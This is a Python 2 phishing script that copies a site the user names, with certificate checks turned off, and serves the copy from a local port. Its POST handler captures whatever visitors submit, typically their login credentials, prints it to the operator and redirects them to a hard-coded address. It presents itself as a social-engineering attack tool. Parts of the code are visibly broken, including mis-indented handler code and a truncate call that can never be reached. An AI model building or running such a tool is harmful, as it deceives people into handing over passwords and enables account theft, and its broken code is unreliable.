import SocketServer;from scapy.all import *;import random                                                                                    
import BaseHTTPServer;from BaseHTTPServer import BaseHTTPRequestHandler                                                                      
from BaseHTTPServer import HTTPServer                                                                                                        
import urllib2
import termcolor
import re;import ssl
import time;from time import sleep
__banner__="""!!!!!!!!!!!!!!!!!!!!!!!!!!! (SOCIAL ENGINNERING ATTCK)!!!!!!!!!!!!!!!!!!!!!!!
                    AUTHOR ==> Tekchand                                                                                                                          
                    Warning ==> I am not responsible for any damange"""                                                                                                                                                                                                                                                                                                                                                                userinput=raw_input("Enter the URL to clone website: ")
remotedata=urllib2.Request(userinput)
ssltest=ssl.create_default_context()                                                                                                         
ssltest.check_hostname=False
ssltest.verify_mode=ssl.CERT_NONE
remotedata.add_header('User-Agent','Mozilla/firefox55.65')
finaldata=urllib2.urlopen(remotedata,context=ssltest).read()                                                                                 
randomport=random.randint(3000,65535)
with open("index.html","r+") as tp:
    tp.writelines(finaldata)
    print "Clonned website complete...."
    print "Open the link.  %s" % (termcolor.colored("http://%s:%s" % (get_if_addr('eth0'),randomport),"yellow",attrs=['bold']))

class Pishing(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)                                                                                                                      
        self.send_header('Content-Type','text/html')
        self.end_headers()
                                                                                                                                                     
with open('index.html','rb') as fp:
            for i in fp.readlines():
                self.wfile.write(i.strip())

    def do_POST(self):                                                                                                                               
        self.send_response(200)
        handler=int(self.headers['Content-Length'])
        data=self.rfile.read(handler)
        print termcolor.colored("Posting data receiving..","yellow",attrs=['bold'])
        sleep(1)
        print termcolor.colored(data,"green",attrs=['bold'])
        self.wfile.write("<html><head><meta http-equiv='refresh' content='0;url=%s'</head></html>" % ("http://10.0.2.15:5566"))



if __name__ == "__main__":
    HOST,PORT=str(get_if_addr('eth0')),randomport
    tester=HTTPServer((HOST,PORT),Pishing)
    tester.serve_forever()
    tp.truncate(0)
